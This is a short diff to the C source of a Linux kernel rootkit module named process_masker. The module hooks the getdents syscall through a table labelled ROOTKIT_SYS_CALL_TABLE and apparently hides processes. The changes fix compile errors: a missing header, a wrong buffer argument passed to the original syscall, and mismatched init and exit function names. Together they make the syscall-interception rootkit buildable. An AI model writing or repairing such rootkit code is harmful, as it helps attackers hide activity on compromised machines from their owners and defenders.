@@ -26,6 +26,7 @@
 
 #include <linux/module.h>   /* Needed by all modules */
 #include <linux/unistd.h>   /* Needed for __NR_getdents */
+#include <linux/syscalls.h>   /* Needed for struct linux_dirent */
 #include "sysmap.h"   /* Needed for ROOTKIT_SYS_CALL_TABLE */
 
 
@@ -42,7 +43,7 @@ asmlinkage int my_getdents_syscall_ref(unsigned int fd, struct linux_dirent *dir
 	int res;
 
 	/* Call original getdents_syscall */
-	res = getdents_syscall_ref(fd, buf, count);
+	res = getdents_syscall_ref(fd, dirp, count);
 
 	printk(KERN_INFO "Mouaxaxaxaxaxa!");
 
@@ -114,5 +115,5 @@ static void __exit process_masker_end(void)
 	return;
 }
 
-module_init(interceptor_start);
-module_exit(interceptor_end);
+module_init(process_masker_start);
+module_exit(process_masker_end);
